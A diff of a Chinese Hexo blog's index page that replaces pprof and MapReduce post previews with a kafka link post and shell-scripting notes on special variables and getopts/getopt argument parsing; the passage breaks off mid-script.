@@ -270,7 +270,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/19/go/pprof/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/30/kafka/kafka/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -289,7 +289,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/11/19/go/pprof/" itemprop="url">pprof工具使用</a></h1>
+                <a class="post-title-link" href="/2019/12/30/kafka/kafka/" itemprop="url">kafka</a></h1>
         
 
         <div class="post-meta">
@@ -301,8 +301,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-19T16:29:33+08:00">
-                2019-11-19
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-30T11:45:50+08:00">
+                2019-12-30
               </time>
             
 
@@ -394,9 +394,9 @@
       
         
           
-            <h2 id="pprof"><a href="#pprof" class="headerlink" title="pprof"></a>pprof</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># runtime.MemStats</span><br><span class="line"># Alloc = 6911928</span><br><span class="line"># TotalAlloc = 19160914800</span><br><span class="line"># Sys = 72373071</span><br><span class="line"># Lookups = 0</span><br><span class="line"># Mallocs = 201435665</span><br><span class="line"># Frees = 201407065</span><br><span class="line"># HeapAlloc = 6911928</span><br><span class="line"># HeapSys = 65994752</span><br><span class="line"># HeapIdle = 56852480</span><br><span class="line"># HeapInuse = 9142272</span><br><span class="line"># HeapReleased = 52936704</span><br><span class="line"># HeapObjects = 28600</span><br><span class="line"># Stack = 1114112 / 1114112</span><br><span class="line"># MSpan = 106488 / 196608</span><br><span class="line"># MCache = 6944 / 65536</span><br><span class="line"># BuckHashSys = 1616868</span><br><span class="line"># GCSys = 2394112</span><br><span class="line"># OtherSys = 991083</span><br><span class="line"># NextGC = 11362960</span><br><span class="line"># LastGC = 1574322082513879647</span><br><span class="line"># PauseNs = [189598 49953 92502 32422 38027 82085 100885 229316 76361 72260 78828 39619 149152 46332 70705 17145 16763 58004 64772 28182 78964 723741 61377 82393 95501 14008 20076 61063 43738 26423 80042 38541 71009 56981 28659 28020 71551 31313 98150 73792 79719 23929 99861 22701 120759 22477 68964 42352 11666 27739 59629 43175 31219 30039 81174 27849 25645 151912 49662 10258 22584 75402 63296 13006 43117 178897 31601 140531 28393 122639 85584 101906 10499 61339 126044 62926 16444 23959 49294 58229 18315 22263 42363 11487 13774 64256 78467 55070 17849 123218 49329 41235 15583 27532 22365 138046 143495 82689 83776 22407 16361 72739 30012 88179 53863 57042 19235 36012 49999 10093 150366 57210 74770 33872 17570 80342 33627 130745 45451 44563 68349 91948 80106 96768 123250 68130 37997 85617 52326 105215 79923 59876 82770 34976 71308 75440 74769 52477 81582 28035 26408 81097 51790 87575 83188 97461 74315 14031 63507 60049 70288 26258 30603 70501 25757 76272 54131 11315 15774 47247 28143 16491 44517 397021 109310 75557 38932 54458 57195 101318 13764 12970 61384 70465 74954 34697 74424 49610 546274 37799 21334 23761 26868 25757 67495 37693 48941 31569 11449 49646 26411 28535 17298 60990 14267 45562 81123 95301 51616 41552 68802 69589 80352 30789 85043 150628 9825 48716 31399 17660 90074 29268 58238 66220 21357 36999 83608 49139 10383 68450 52035 18896 22419 82571 20467 20933 49959 50114 24937 62938 17763 70881 29038 88511 33083 12115 39858 55640 25758 85965 25077 163754 28138 14249 57188 80709 53402 62238 78211 51991 12517 70669 66887 94401 65900 22837]</span><br><span class="line"># PauseEnd = [1574322080390712046 1574322080402601456 1574322080417597815 1574322080430075401 1574322080448743679 1574322080481843308 1574322080503285042 1574322080521567097 1574322080537619917 1574322080559570756 1574322080588332615 1574322080605197934 1574322080618694803 1574322080636061669 1574322080657184934 1574322080684348212 1574322080705329009 1574322080719469909 1574322080736620249 1574322080755391983 1574322080777142378 1574322080801636089 1574322080825558326 1574322080836895171 1574322080849027987 1574322080865581420 1574322080878967168 1574322080900290388 1574322080919367030 1574322080940890269 1574322080974232859 1574322080988857538 1574322081002500813 1574322081017118019 1574322081035119959 1574322081052533660 1574322081065488769 1574322081083060618 1574322081103290742 1574322081117706184 1574322081132701465 1574322081153895098 1574322081177445475 1574322081196174521 1574322081209746571 1574322081223541458 1574322081238549400 1574322081253663527 1574322081279011933 1574322081295221475 1574322081312807380 1574322081329454242 1574322081349673665 1574322081382931596 1574322081398104595 1574322081411675607 1574322081423663058 1574322081435591228 1574322081452690208 1574322081482717475 1574322081506495585 1574322081523191972 1574322081539546871 1574322081560526634 1574322081585884075 1574322081604924504 1574322081620393778 1574322081636910237 1574322081649709918 1574322081671440093 1574322081692351239 1574322081714954880 1574322081736383517 1574322081759477966 1574322081780396845 1574322081809275402 1574322081832646903 1574322081844973974 1574322081859919543 1574322081878146929 1574322081894049877 1574322081918470164 1574322081942839690 1574322081962122724 1574322081973635354 1574322081991546597 1574322082006185907 1574322082020228404 1574322082043356433 1574322082062069998 1574322082092364700 1574322082111501695 1574322082127799248 1574322082141316859 1574322082157849501 1574322082177158998 1574322082190978605 1574322082206080529 1574322082220254360 1574322082238405644 1574322082255306291 1574322082287696098 1574322082300844344 1574322082315626425 1574322082327934125 1574322082342279708 1574322082359464097 1574322082403441800 1574322082421731674 1574322082447831735 1574322082472752623 1574322082486526178 1574322082502363044 1574322082513879647 1574322077489750221 1574322077502583900 1574322077515159633 1574322077531276251 1574322077553955480 1574322077574258541 1574322077596114790 1574322077613266937 1574322077625509198 1574322077640497140 1574322077674765140 1574322077702541016 1574322077721769598 1574322077738605211 1574322077775075178 1574322077799454347 1574322077822280173 1574322077835197697 1574322077850735655 1574322077882828316 1574322077916692835 1574322077938708711 1574322077973382082 1574322077990437988 1574322078006060345 1574322078018689112 1574322078030868740 1574322078048097314 1574322078077412649 1574322078099010773 1574322078116051403 1574322078133467101 1574322078145929683 1574322078164972882 1574322078193059776 1574322078218462494 1574322078243964527 1574322078271299425 1574322078296295965 1574322078311903980 1574322078323289651 1574322078340564935 1574322078355041152 1574322078379113651 1574322078397064652 1574322078410283359 1574322078425451781 1574322078461478242 1574322078489565281 1574322078509050699 1574322078520379771 1574322078534615753 1574322078551371364 1574322078569855252 1574322078590158746 1574322078610728096 1574322078632052560 1574322078653213142 1574322078689313302 1574322078706298386 1574322078719347046 1574322078733274403 1574322078757892267 1574322078807458635 1574322078829797069 1574322078847526699 1574322078863212705 1574322078893213248 1574322078912050577 1574322078932015146 1574322078952862198 1574322078968937939 1574322078983422259 1574322079003764382 1574322079024587932 1574322079077176784 1574322079096946991 1574322079115658208 1574322079129207783 1574322079143182694 1574322079157474200 1574322079193690884 1574322079206345901 1574322079226361253 1574322079242177073 1574322079260978719 1574322079314650080 1574322079329493542 1574322079345056294 1574322079368803814 1574322079387376484 1574322079408767141 1574322079428095837 1574322079449106465 1574322079467998999 1574322079485391468 1574322079499939713 1574322079512307848 1574322079524423908 1574322079544692641 1574322079572892982 1574322079601073467 1574322079616249315 1574322079633470438 1574322079647391778 1574322079672249349 1574322079693840219 1574322079710479969 1574322079723083791 1574322079740765000 1574322079761293570 1574322079789464150 1574322079807361784 1574322079829103390 1574322079849831253 1574322079871286517 1574322079892161883 1574322079912346685 1574322079929479039 1574322079944339751 1574322079983735126 1574322079996146439 1574322080012304729 1574322080025186914 1574322080042884286 1574322080075591239 1574322080092800684 1574322080109987218 1574322080130215766 1574322080148307817 1574322080166223553 1574322080184252577 1574322080201494803 1574322080216216121 1574322080238095235 1574322080254460660 1574322080274530708 1574322080292243817 1574322080311767013 1574322080326532899 1574322080345139037 1574322080374701044]</span><br><span class="line"># NumGC = 7794</span><br><span class="line"># NumForcedGC = 0</span><br><span class="line"># GCCPUFraction = 0.10706624962106928</span><br><span class="line"># DebugGC = false</span><br></pre></td></tr></table></figure>
-
-<p>// Sys 是下面列出的 XSys 字段的综合。Sys 维护着为 Go 运行时预留的虚拟内存空间地址，<br>// 里面包含了：堆、栈，以及其他内部数据结构。<br>Sys uint64</p>
+            <p><a href="https://www.jianshu.com/p/3ed342a28a9d" target="_blank" rel="noopener">https://www.jianshu.com/p/3ed342a28a9d</a></p>
+<p>kafka版本,</p>
+<p><a href="https://luckymrwang.github.io/2016/10/18/%E4%BB%8Ekafka%E4%B8%AD%E6%9F%A5%E8%AF%A2%E7%94%A8%E6%88%B7%E6%97%A5%E5%BF%97%E4%BC%98%E5%8C%96/" target="_blank" rel="noopener">从kafka中查询用户日志优化</a></p>
 
           
         
@@ -445,7 +445,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/18/分布式/MIT 6.824/论文/MapReduce/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/28/Linux/shell脚本/shell脚本技巧/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -464,7 +464,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/11/18/分布式/MIT 6.824/论文/MapReduce/" itemprop="url">MapReduce</a></h1>
+                <a class="post-title-link" href="/2019/12/28/Linux/shell脚本/shell脚本技巧/" itemprop="url">shell脚本技巧</a></h1>
         
 
         <div class="post-meta">
@@ -476,8 +476,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-18T21:43:33+08:00">
-                2019-11-18
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-28T21:44:13+08:00">
+                2019-12-28
               </time>
             
 
@@ -499,8 +499,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/MapReduce/" itemprop="url" rel="index">
-                    <span itemprop="name">MapReduce</span>
+                  <a href="/categories/Linux/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux</span>
                   </a>
                 </span>
 
@@ -569,1457 +569,1636 @@
       
         
           
-            <h1 id="MapReduce"><a href="#MapReduce" class="headerlink" title="MapReduce"></a>MapReduce</h1><p>Hadoop MapReduce 源于 Google 在2004年12月份发表的 MapReduce 论文。Hadoop MapReduce 其实就是 Google MapReduce 的一个克隆版本</p>
-<h2 id="MapReduce-入门"><a href="#MapReduce-入门" class="headerlink" title="MapReduce 入门"></a>MapReduce 入门</h2><p>MapReduce是一种编程模型,其思想来自于函数式编程，和Python，Lisp语言中的map和reduce函数类似,用于大规模数据集的分布式运算<br><a href="https://www.runoob.com/python/python-func-map.html" target="_blank" rel="noopener">python map函数</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="function"><span class="keyword">def</span> <span class="title">square</span><span class="params">(x)</span> :</span>            <span class="comment"># 计算平方数</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> x ** <span class="number">2</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>map(square, [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>])   <span class="comment"># 计算列表各个元素的平方</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>map(<span class="keyword">lambda</span> x: x ** <span class="number">2</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])  <span class="comment"># 使用 lambda 匿名函数</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 提供了两个列表，对相同位置的列表数据进行相加</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>map(<span class="keyword">lambda</span> x, y: x + y, [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>], [<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>])</span><br><span class="line">[<span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">19</span>]</span><br></pre></td></tr></table></figure>
+            <h2 id="linux中shell变量"><a href="#linux中shell变量" class="headerlink" title="linux中shell变量"></a>linux中shell变量</h2><p><strong>linux中shell变量<code>$#</code>,<code>$@</code>,<code>$0</code>,<code>$1</code>,<code>$2</code>的含义解释:</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">变量说明: </span><br><span class="line"><span class="meta">$</span><span class="bash">$ </span></span><br><span class="line">Shell本身的PID（ProcessID） </span><br><span class="line"><span class="meta">$</span><span class="bash">! </span></span><br><span class="line">Shell最后运行的后台Process的PID </span><br><span class="line"><span class="meta">$</span><span class="bash">? </span></span><br><span class="line">最后运行的命令的结束代码（返回值） </span><br><span class="line"><span class="meta">$</span><span class="bash">- </span></span><br><span class="line">使用Set命令设定的Flag一览 </span><br><span class="line"><span class="meta">$</span><span class="bash">* </span></span><br><span class="line">所有参数列表。如"$*"用「"」括起来的情况、以"$1 $2 … $n"的形式输出所有参数。 </span><br><span class="line"><span class="meta">$</span><span class="bash">@ </span></span><br><span class="line">所有参数列表。如"$@"用「"」括起来的情况、以"$1" "$2" … "$n" 的形式输出所有参数。 </span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="comment"># </span></span></span><br><span class="line">添加到Shell的参数个数 </span><br><span class="line"><span class="meta">$</span><span class="bash">0 </span></span><br><span class="line">Shell本身的文件名 </span><br><span class="line"><span class="meta">$</span><span class="bash">1～<span class="variable">$n</span></span></span><br></pre></td></tr></table></figure>
 
-<p><a href="https://www.runoob.com/python/python-func-reduce.html" target="_blank" rel="noopener">Python reduce() 函数</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span> :</span>            <span class="comment"># 两数相加</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> x + y</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reduce(add, [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>])   <span class="comment"># 计算列表和：1+2+3+4+5</span></span><br><span class="line"><span class="number">15</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reduce(<span class="keyword">lambda</span> x, y: x+y, [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>])  <span class="comment"># 使用 lambda 匿名函数</span></span><br><span class="line"><span class="number">15</span></span><br></pre></td></tr></table></figure>
+<p>A:<code>$*</code>和<code>$@</code>的区别</p>
+<p><code>$*</code>和 <code>$@</code>都表示传递给函数或脚本的所有参数，不被双引号(“ “)包含时，都以<code>&quot;$1&quot; &quot;$2&quot; … &quot;$n&quot;</code>的形式输出所有参数。<br>但是当它们被双引号(“ “)包含时，<code>&quot;$*&quot;</code> 会将所有的参数作为一个整体，以<code>&quot;$1 $2 … $n&quot;</code>的形式输出所有参数；<code>&quot;$@&quot;</code> 会将各个参数分开，以<code>&quot;$1&quot; &quot;$2&quot; … &quot;$n&quot;</code>的形式输出所有参数。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">test.sh</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo "\$*=" $*</span><br><span class="line">echo "\"\$*\"=" "$*"</span><br><span class="line">echo "\$@=" $@</span><br><span class="line">echo "\"\$@\"=" "$@"</span><br><span class="line">echo "print each param from \$*"</span><br><span class="line">for var in $*</span><br><span class="line">do</span><br><span class="line">    echo "$var"</span><br><span class="line">done</span><br><span class="line">echo "print each param from \$@"</span><br><span class="line">for var in $@</span><br><span class="line">do</span><br><span class="line">    echo "$var"</span><br><span class="line">done</span><br><span class="line">echo "print each param from \"\$*\""</span><br><span class="line">for var in "$*"</span><br><span class="line">do</span><br><span class="line">    echo "$var"</span><br><span class="line">done</span><br><span class="line">echo "print each param from \"\$@\""</span><br><span class="line">for var in "$@"</span><br><span class="line">do</span><br><span class="line">    echo "$var"</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
 
-<p><a href="https://dbaplus.cn/news-21-1277-1.html" target="_blank" rel="noopener">7个实例全面掌握Hadoop MapReduce</a></p>
-<h2 id="MapReduce进阶"><a href="#MapReduce进阶" class="headerlink" title="MapReduce进阶"></a>MapReduce进阶</h2><h3 id="MapReduce工作过程"><a href="#MapReduce工作过程" class="headerlink" title="MapReduce工作过程"></a>MapReduce工作过程</h3><p><img src="https://raw.githubusercontent.com/bloodsucker1/note_img/master/imgmapreduce.png" alt></p>
-<ol>
-<li>MapReduce框架对输入的文件数据分成M片，每份数据的大小为16~64MB（可由用户配置）。</li>
-<li>在多台机器上开始运行User Program：包括一个master、多个map worker和多个reduce worker。</li>
-<li>master主要负责map worker和reduce worker的状态管理和任务分发。</li>
-<li>map worker从GFS读取分配到的文件数据，并进行相应的处理。MapReduce框架的调度会尽量使map worker运行的机器与数据靠近，以提高数据传输的效率。所以，数据传输可以是本地，也可能是网络。</li>
-<li>map worker的输出缓存在内存中，并定期刷到本地磁盘上。这些中间数据的位置信息会通过心跳信息告诉master，master记下这些信息后，通知reduce worker。数据存储在本地。</li>
-<li>reduce worker通过RPC从map worker读取需要的中间数据。数据通过网络传输。</li>
-<li>reduce worker对中间数据进行“合并”处理后，输出结果。</li>
-</ol>
-<h3 id="容灾"><a href="#容灾" class="headerlink" title="容灾"></a>容灾</h3><p>MapReduce 如何容灾是其最重要的部分，对于故障我们可以分为 worker故障和master故障，worker故障又可以分为 map worker和reduce worker。</p>
-<h4 id="Worker故障"><a href="#Worker故障" class="headerlink" title="Worker故障"></a>Worker故障</h4><p>Master 通过心跳的机制来检测worker故障</p>
+<p><code>./test.sh &quot;a&quot; &quot;b&quot; &quot;c&quot; &quot;d&quot;</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">*= a b c d</span></span><br><span class="line"></span><br><span class="line">"$*"= a b c d</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">@= a b c d</span></span><br><span class="line"></span><br><span class="line">"$@"= a b c d</span><br><span class="line"></span><br><span class="line">print each param from $*</span><br><span class="line"></span><br><span class="line">a</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line"></span><br><span class="line">c</span><br><span class="line"></span><br><span class="line">d</span><br><span class="line"></span><br><span class="line">print each param from $@</span><br><span class="line"></span><br><span class="line">a</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line"></span><br><span class="line">c</span><br><span class="line"></span><br><span class="line">d</span><br><span class="line"></span><br><span class="line">print each param from "$*"</span><br><span class="line"></span><br><span class="line">a b c d</span><br><span class="line"></span><br><span class="line">print each param from "$@"</span><br><span class="line"></span><br><span class="line">a</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line"></span><br><span class="line">c</span><br><span class="line"></span><br><span class="line">d</span><br></pre></td></tr></table></figure>
+
+<p>B:<code>$?</code>退出状态</p>
+<p>就是上一个命令执行后的返回结果。退出状态是一个数字，一般情况下，大部分命令执行<code>成功会返回 0，失败返回 1</code>。不过，也有一些命令返回其他值，表示不同类型的错误。</p>
+<h2 id="getopts参数处理"><a href="#getopts参数处理" class="headerlink" title="getopts参数处理"></a>getopts参数处理</h2><h3 id="使用getopts方式实现短选项的处理"><a href="#使用getopts方式实现短选项的处理" class="headerlink" title="使用getopts方式实现短选项的处理"></a>使用<code>getopts</code>方式实现短选项的处理</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">getopts.sh</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">PROG=`basename $0`</span><br><span class="line">usage() &#123;</span><br><span class="line">    cat &lt;&lt;EOF</span><br><span class="line">Usage: $&#123;PROG&#125; [OPTION]…</span><br><span class="line">Find out the highest cpu consumed threads of java, and print the stack of these threads.</span><br><span class="line">Example: $&#123;PROG&#125; -i interface -P 3306 start</span><br><span class="line">Options:</span><br><span class="line">    -i, interface</span><br><span class="line">    -c, port</span><br><span class="line">    -h, --help display this help and exit</span><br><span class="line">EOF</span><br><span class="line">    exit $1</span><br><span class="line">&#125;</span><br><span class="line">while getopts "i:P:" arg</span><br><span class="line">do</span><br><span class="line">    case $arg in</span><br><span class="line">        i)</span><br><span class="line">            interface=$&#123;OPTARG:-any&#125;</span><br><span class="line">            ;;</span><br><span class="line">        P)</span><br><span class="line">            port=$&#123;OPTARG:-3306&#125;</span><br><span class="line">        ;;</span><br><span class="line">        ?)</span><br><span class="line">            usage 1</span><br><span class="line">        ;;</span><br><span class="line">    esac</span><br><span class="line">done</span><br><span class="line">interface=$&#123;interface:-any&#125;</span><br><span class="line">port=$&#123;port:-3306&#125;</span><br><span class="line">shift $(($OPTIND - 1))</span><br><span class="line">if [ $# -eq 0 ]; then</span><br><span class="line">    usage 1</span><br><span class="line">fi</span><br><span class="line">mode=$1</span><br><span class="line">echo $interface</span><br><span class="line">echo $port</span><br><span class="line">echo $mode</span><br></pre></td></tr></table></figure>
+
+<p>A:<code>while getopts &quot;:a:bc&quot; opt</code> </p>
+<p>第一个冒号表示忽略错误；字符后面的冒号表示该选项必须有自己的参数</p>
+<p>B:<code>shift $(($OPTIND - 1))</code></p>
+<p>通过<code>shift $(($OPTIND - 1))</code>的处理，$*中就只保留了除去选项内容的参数，可以在其后进行正常的shell编程处理了。 </p>
+<p>C:<code>basename $0</code> 取出文件名</p>
+<p>D:<code>usage 1</code>代表传参1,在usage中执行exit 1退出</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if [ $# -eq 0 ]; then</span><br><span class="line">    usage 1</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+
+<p>F:放在<code>shift $(($OPTIND - 1))</code>之后,有两个作用:一是传入参数为0时退出，二是选项之后没有跟参数时退出</p>
+<p>G:getopts不能直接处理长的选项（如：–prefix=/home等）</p>
+<p>H:内置变量<code>$OPTARG</code>和<code>$OPTIND</code>,<code>$OPTARG</code>存储相应选项的参数，而<code>$OPTIND</code>总是存储原始<code>$*</code>中下一个要处理的元素位置</p>
+<p>I:interface=<code>${OPTARG:-any}</code>为了在interface为空字符串时赋值any,interface=<code>${interface:-any}</code>,为了防止在interface没有输入时，设置为any</p>
+<h3 id="使用getopt实现长-短选项的处理"><a href="#使用getopt实现长-短选项的处理" class="headerlink" title="使用getopt实现长/短选项的处理"></a>使用<code>getopt</code>实现长/短选项的处理</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">basename命令用于打印目录或者文件的基本名称</span></span><br><span class="line"></span><br><span class="line">PROG=`basename $0`</span><br><span class="line"></span><br><span class="line">usage() &#123;</span><br><span class="line">    cat &lt;&lt;EOF</span><br><span class="line">Usage: $&#123;PROG&#125; [OPTION]...</span><br><span class="line">Find out the highest cpu consumed threads of java, and print the stack of these threads.</span><br><span class="line">Example: $&#123;PROG&#125; -c 10</span><br><span class="line">Options:</span><br><span class="line">    -p, --pid find out the highest cpu consumed threads from the specifed java process,</span><br><span class="line">                    default from all java process.</span><br><span class="line">    -c, --count set the thread count to show, default is 5</span><br><span class="line">    -h, --help display this help and exit</span><br><span class="line">EOF</span><br><span class="line">    exit $1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if [ $# -eq 0 ]; then</span><br><span class="line">    usage 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">ARGS=`getopt -n "$PROG" -a -o c:p:h -l count:,pid:,help -- "$@"`</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">等价于[ $? -ne 0 ] &amp;&amp; usage，就是如果前面的错误就调用usage方法</span></span><br><span class="line"></span><br><span class="line">[ $? -ne 0 ] &amp;&amp; usage 1</span><br><span class="line"></span><br><span class="line">eval set -- 